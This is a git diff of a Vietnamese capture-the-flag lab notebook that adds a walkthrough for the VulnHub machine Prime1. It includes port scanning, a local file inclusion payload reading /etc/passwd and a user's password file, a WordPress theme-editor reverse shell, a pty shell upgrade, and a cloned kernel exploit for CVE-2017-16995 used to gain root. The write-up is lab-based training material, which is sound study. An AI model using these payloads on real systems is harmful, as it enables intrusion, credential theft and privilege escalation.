@@ -381,7 +381,7 @@ Nguồn hướng dẫn:[Đây](https://resources.infosecinstitute.com/topic/dark
    
    Sau khi đã có IP máy mục tiêu, quét các cổng bằng Nmap tool:
    
-   `nmap -sV -p- 192.168.1.4`
+   `nmap -sV -p- 192.168.1.7`
 
    ![image](https://github.com/tninh27/Lab/assets/105789492/4ec60209-f825-496f-b694-0b6ab7f1cadc)
 
@@ -459,19 +459,109 @@ Nguồn hướng dẫn:[Đây](https://resources.infosecinstitute.com/topic/dark
 
 ## V. Prime1
 
+Nguồn hướng dẫn:[Đây](https://www.hackingarticles.in/prime-1-vulnhub-walkthrough/)
 
+1. Tìm kiếm mục tiêu, quét cổng
 
+   Đầu tiên dùng netdiscover tool để khám phá mạng xung quanh, tìm địa chỉ IP mục tiêu:
+   `netdiscover`
+   
+   Sau khi đã có IP máy mục tiêu, quét các cổng bằng Nmap tool:
+   
+   `nmap -A 192.168.1.8`
 
+   - Ta có: 22 ssh, 80 web
 
+2. Liệt kê
 
+   Dùng công cụ dirb xem các thư mục:
 
+   `dirb http://192.168.1.8`
 
+   ![image](https://github.com/tninh27/Lab/assets/105789492/28123b0e-d720-4ace-9b0b-cb733c14638e)
 
+   Xem bằng trình duyệt:
 
+   ![image](https://github.com/tninh27/Lab/assets/105789492/fc663aee-98eb-4c6f-9616-55d17593c40d)
 
+   Tiếp tục dùng dirb thêm đuôi .txt:
 
+   `dirb http://192.168.1.8/ -X .txt`
 
+   ![image](https://github.com/tninh27/Lab/assets/105789492/2c7d838b-c213-4eb7-b9e6-111e887c7d18)
 
+   Xem file secret.txt:
 
+   ![image](https://github.com/tninh27/Lab/assets/105789492/7d0d8eeb-b67d-4b0c-ba7f-34765a2d1123)
 
+   Tiếp tục xem trên web:
+   `http://192.168.1.8/index.php?file=`
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/8e4fa9bc-397d-412e-a4ff-4d1ec8e098b1)
+
+   `http://192.168.1.8/index.php?file=location.txt`
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/97ce95f9-3be6-4d54-8b9f-b8a0dd391e35)
+
+   - Thấy gợi ý sử dụng secrettier360
+
+3. Khai thác
+
+   Dùng gợi ý secrettier360, xem trên web:
+
+   `http://192.168.1.8/image.php?secrettier360=/etc/passwd`
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/7d6b232e-8e9d-4cab-91de-bc7ace848e54)
+
+   - Thấy gợi ý về tài khoản saket
+
+   `http://192.168.1.8/image.php?secrettier360=/home/saket/password.txt`
+
+   - Có được mật khẩu đăng nhập
+   
+   Tiến hành đăng nhập wordpress:
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/0a2f9e43-8cf5-446d-b758-f9a6d573db51)
+
+   Tìm kiếm thấy tệp secret.php(trong phần theme editor) có quyền ghi, viết lệnh vào đây:
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/20f2292b-4d75-41b8-9838-b526bb915d71)
+
+   Copy đoạn code reverse shell vào đây, nhấn update:
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/a7a286c6-05c2-47e7-9fa9-ca3afaba30a9)
+
+   Nghe cổng vừa tạo và kích hoạt file trên:
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/eed967ed-131f-436e-bf17-07ee9c257d64)
+
+   Đã có shell, chạy lệnh khai thác:
+   
+   `python -c ‘import pty;pty.spawn(“/bin/bash”)’`
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/8f569eab-adc1-4e2a-9eeb-3b8f6c2320cb)
+
+4. Leo thang đặc quyền
+
+   Xem phiên bản hệ điều hành: `uname -a`
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/f40b5b46-bd6f-4c87-b76a-e1e09d57d9ea)
+
+   - Thấy phiên bản này tồn tại lỗ hổng có thể khai thác
+
+   Tải công cụ khai thác, cấp quyền và chạy nó:
+
+   `git clone https://github.com/kkamagui/linux-kernel-exploits`
+
+   `./compile.sh`
+   
+   `./CVE-2017-16995`
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/8832c440-7df4-421a-add4-ea2e3b5e3fbf)
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/560d1ef0-fc43-4026-a381-07a3b4d1d299)
+
+   Sau khi chạy thành công đã có root, xem file root.txt:
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/3466e67f-afae-4fa4-9b22-9465d79a1db0)
 
